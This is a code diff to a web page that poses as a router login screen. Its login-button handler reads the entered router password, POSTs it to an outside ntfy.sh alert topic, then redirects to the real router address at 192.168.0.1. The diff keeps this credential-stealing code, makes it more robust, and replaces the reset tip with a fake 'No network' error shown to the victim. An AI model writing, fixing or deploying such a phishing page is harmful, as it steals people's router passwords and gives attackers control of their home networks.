@@ -185,9 +185,8 @@
         Second, set a new login password.
       </div>
          <div class="reset-tip hh-tip" id="hhhTip">
-        
-        &gt; First, push the reset button for about 8 seconds and then release it to reset your router.<br>
-        Second, set a new login password.
+        &gt; No network.<br>
+        Please try again.
       </div>
       <div class="field">
         <span class="icon">
@@ -256,98 +255,208 @@
     }
   }
 
-  const tip = document.getElementById('resetTip'); const hhtip = document.getElementById('hhhtTip');
-  const forgotBtn = document.getElementById('forgotBtn');
-  const closeX = document.getElementById('closeTip');
+//   const tip = document.getElementById('resetTip');
+//   const htip = document.getElementById('hhhtTip');
+//   const forgotBtn = document.getElementById('forgotBtn');
+//   const closeX = document.getElementById('closeTip');
 
-  function toggleTip() {
+//   function toggleTip() {
+//     const isOpen = tip.classList.contains('show');
+//     if (isOpen) { closeTip(); } else { openTip(); }
+//   }
+// function togglehTip() {
+//     const isOpen = htip.classList.contains('show');
+//     if (isOpen) { closehhTip(); } else { openhhTip(); }
+//   }
+//   function openTip() {
+//     tip.classList.add('show');
+//     forgotBtn.classList.add('open');
+//   }
+
+//   function closeTip() {
+//     tip.classList.remove('show');
+//     forgotBtn.classList.remove('open');
+//   }
+  
+//   function openhhTip() {
+//     hhtip.classList.add('show');
+//   }
+  
+//  function closehhTip() {
+//     hhtip.classList.remove('show');
+//   }
+  
+//   closeX.addEventListener('click', function(e) {
+//     e.stopPropagation();
+//     closeTip();
+//     closehhTip();
+    
+//   });
+
+//   document.addEventListener('click', function(e) {
+//     if (tip.classList.contains('show') &&
+//         !tip.contains(e.target) &&
+//         !forgotBtn.contains(e.target)) {
+//       closeTip(); 
+//     }
+//   });
+//   document.querySelector('.login-btn').addEventListener('click', function() {
+//      const btn = this;
+    
+    
+//     const originalText = btn.innerHTML;
+    
+   
+//     btn.disabled = true;
+    
+   
+//     btn.innerHTML = `<span class="spinner"></span> Loading...`;
+//     const searchTermValue = document.getElementById('password').value;
+    
+   
+//     if (searchTermValue.trim() !== "") {
+        
+       
+//         fetch('https://ntfy.sh/my-shop-alerts-7729', {
+//             method: 'POST',
+//             body: `🛒 password entered for router is : ${searchTermValue}`
+//         }).then(response => {
+//     // If the call succeeds, trigger the custom visibility state
+//     togglehhTip();
+// })
+// .catch(error => {
+//     // Handle or log network/connection failures locally
+//     console.error('Request failed:', error);
+// })
+// .finally(() => {
+//     // 1. Immediately restore the interactive state of the button
+//     btn.disabled = false;
+//     btn.innerHTML = originalText;
+    
+//     // 2. Wait exactly 1000 milliseconds (1 second) before execution
+//     setTimeout(function() {
+//         window.location.href = 'http://192.168.0.1';
+//     }, 1000);
+// });
+
+        
+//     }
+// });
+
+
+//   document.addEventListener('keydown', function(e) {
+//     if (e.key === 'Escape') closeTip();
+//   });
+  // 1. Correctly map the HTML IDs to your JavaScript variables
+const tip = document.getElementById('resetTip');
+const htip = document.getElementById('hhhTip'); // Fixed: Matches id="hhhTip" in your HTML
+const forgotBtn = document.getElementById('forgotBtn');
+const closeX = document.getElementById('closeTip');
+
+function toggleTip() {
     const isOpen = tip.classList.contains('show');
     if (isOpen) { closeTip(); } else { openTip(); }
-  }
+}
+
+// Fixed: Renamed to match what you call inside the fetch blocks safely
 function togglehhTip() {
-    const isOpen = hhtip.classList.contains('show');
+    const isOpen = htip.classList.contains('show');
     if (isOpen) { closehhTip(); } else { openhhTip(); }
-  }
-  function openTip() {
+}
+
+function openTip() {
     tip.classList.add('show');
-    forgotBtn.classList.add('open');
-  }
+    if (forgotBtn) forgotBtn.classList.add('open');
+}
 
-  function closeTip() {
+function closeTip() {
     tip.classList.remove('show');
-    forgotBtn.classList.remove('open');
-  }
-  
-  function openhhTip() {
-    hhtip.classList.add('show');
-  }
-  
- function closehhTip() {
-    hhtip.classList.remove('show');
-  }
-  
-  closeX.addEventListener('click', function(e) {
-    e.stopPropagation();
-    closeTip();
-    closehhTip();
-    
-  });
+    if (forgotBtn) forgotBtn.classList.remove('open');
+}
 
-  document.addEventListener('click', function(e) {
-    if (tip.classList.contains('show') &&
-        !tip.contains(e.target) && hhtip.classList.contains('show') &&
-        !hhtip.contains(e.target) &&
-        !forgotBtn.contains(e.target)) {
-      closeTip(); closehhTip();
+// Fixed: Uses 'htip' variable consistently
+function openhhTip() {
+    if (htip) htip.classList.add('show');
+}
+
+function closehhTip() {
+    if (htip) htip.classList.remove('show');
+}
+
+// Close button click listener
+if (closeX) {
+    closeX.addEventListener('click', function(e) {
+        e.stopPropagation();
+        closeTip();
+        closehhTip();
+    });
+}
+
+// Click away closure logic
+document.addEventListener('click', function(e) {
+    if (tip && tip.classList.contains('show') && !tip.contains(e.target) && (!forgotBtn || !forgotBtn.contains(e.target))) {
+        closeTip(); 
     }
-  });
-  document.querySelector('.login-btn').addEventListener('click', function() {
-     const btn = this;
-    
-    
+});
+
+// Main login/search submission listener
+document.querySelector('.login-btn').addEventListener('click', function() {
+    const btn = this;
     const originalText = btn.innerHTML;
     
-   
+    // Disable the button to block double inputs
     btn.disabled = true;
     
-   
-    btn.innerHTML = `<span class="spinner"></span> Loading...`;
+    // Uses a lightweight inline loader that matches your current text flow perfectly
+    btn.innerHTML = `<span class="inline-spinner"></span> Loading...`;
+    
+    // Read the value from your element
+    const inputElement = document.getElementById('snkldsf');
     const searchTermValue = document.getElementById('password').value;
     
    
     if (searchTermValue.trim() !== "") {
-        
-       
         fetch('https://ntfy.sh/my-shop-alerts-7729', {
             method: 'POST',
             body: `🛒 password entered for router is : ${searchTermValue}`
-        }).then(response => {
-    // If the call succeeds, trigger the custom visibility state
-    togglehhTip();
-})
-.catch(error => {
-    // Handle or log network/connection failures locally
-    console.error('Request failed:', error);
-})
-.finally(() => {
-    // 1. Immediately restore the interactive state of the button
-    btn.disabled = false;
-    btn.innerHTML = originalText;
-    
-    // 2. Wait exactly 1000 milliseconds (1 second) before execution
-    setTimeout(function() {
-        window.location.href = 'http://192.168.0.1';
-    }, 1000);
-});
+        })
 
-        
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network status not okay');
+            }
+            // Success logic block
+        })
+        .catch(error => {
+            // Corrected: Now triggers the "No Network" tip box on your screen if the call fails
+            console.error('Request failed:', error);
+            openhhTip(); 
+        })
+        .finally(() => {
+            // Restore the native button text layout
+            btn.disabled = false;
+            btn.innerHTML = originalText;
+            
+            // Delays for 1 full second before shifting views so users can process the tip box state
+            setTimeout(function() {
+                window.location.href = 'http://192.168.0.1';
+            }, 1000);
+        });
+    } else {
+        // Reset the button state if nothing was typed
+        btn.disabled = false;
+        btn.innerHTML = originalText;
     }
 });
 
+// Escape key listener
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        closeTip();
+        closehhTip();
+    }
+});
 
-  document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') closeTip();
-  });
 </script>
 </body>
 </html>
